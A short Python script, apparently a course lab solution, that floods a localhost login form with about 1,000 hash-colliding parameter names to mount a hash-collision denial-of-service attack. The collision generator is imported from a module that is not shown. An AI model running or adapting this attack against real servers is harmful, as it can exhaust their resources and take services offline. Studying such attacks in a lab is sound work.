from requests import codes, Session
from collisions import find_collisions, key

LOGIN_FORM_URL = "http://localhost:8080/login"

#This function will send the login form
#with the colliding parameters you specify.
def do_login_form(sess, username,password,params=None):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	if not params is None:
		data_dict.update(params)
	response = sess.post(LOGIN_FORM_URL,data_dict)
	print(response)


def do_attack():
	sess = Session()
	#Choose any valid username and password
	uname ="attacker"
	pw = "attacker"
	#Put your colliding inputs in this dictionary as parameters.
	colls = find_collisions(key, 1000) # takes 14min to generate 1000
	# res1.txt use for testing, it includes 1000 strs has the same bucket_id,
	# with open("./res1.txt", 'r') as f:
	# 	colls = f.read().strip('[').strip(']').replace("'","").replace(" ",'').split(",")
	attack_dict = {param: 0 for param in colls}
	response = do_login_form(sess, uname,pw,attack_dict)

if __name__=='__main__':
	do_attack()
